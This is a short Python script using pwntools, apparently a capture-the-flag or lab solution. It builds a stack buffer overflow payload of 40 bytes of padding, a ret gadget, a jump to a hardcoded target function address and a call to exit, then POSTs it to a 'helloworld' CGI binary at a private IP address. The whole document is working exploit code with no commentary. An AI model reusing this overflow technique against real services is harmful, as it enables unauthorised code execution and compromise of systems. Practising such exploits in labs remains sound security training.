from pwn import *
import requests

elf = ELF('./helloworld')

#context(arch='amd64', os='linux')
#context.log_level = 'debug'

url = 'http://10.140.32.159:47353/cgi-bin/helloworld'

offset = 40
target_addr = 0x0401256

ret = 0x40101a

payload = b'a' * offset + p64(ret) + p64(target_addr) + p64(elf.plt['exit'])

ret = requests.post(url, data = payload)
print(ret.text)